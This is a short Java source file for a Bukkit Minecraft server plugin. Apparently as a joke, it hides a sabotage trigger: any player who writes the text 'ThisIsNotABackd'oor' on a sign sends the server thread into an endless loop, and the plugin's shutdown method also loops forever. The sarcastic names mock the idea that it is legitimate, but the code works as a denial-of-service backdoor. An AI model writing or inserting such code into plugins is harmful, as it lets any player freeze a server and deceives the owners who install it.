package a;

import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.plugin.java.JavaPlugin;


public class Mian extends JavaPlugin implements Listener {
    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        while (true) {}
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void onPlayerUseUsefulPluginThatServerOwnerAllowedThatOfCourseOrTheServerOwnerWontInstallThis(SignChangeEvent playerUseUsefulPluginThatServerOwnerAllowedThatOfCourseOrTheServerOwnerWontInstallThis) {
        for (String fullyLegitLine : playerUseUsefulPluginThatServerOwnerAllowedThatOfCourseOrTheServerOwnerWontInstallThis.getLines()) {
            if (fullyLegitLine.equals("ThisIsNotABackd'oor")) {
                while (true) {}}}}}
